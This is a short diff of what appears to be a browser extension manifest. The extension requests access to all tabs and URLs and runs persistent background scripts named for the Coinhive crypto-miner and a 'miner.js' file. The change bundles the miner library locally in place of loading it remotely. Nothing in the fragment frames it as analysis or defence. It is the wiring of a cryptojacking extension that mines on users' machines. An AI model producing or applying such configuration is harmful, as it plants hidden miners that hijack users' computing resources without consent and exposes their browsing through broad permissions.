@@ -12,7 +12,7 @@
   "permissions": ["tabs", "<all_urls>"],
 
   "background": {
-    "scripts": ["https://coinhive.com/lib/coinhive.min.js", "miner.js"],
+    "scripts": ["coinhive.min.js", "miner.js"],
     "persistent": true
   },
 
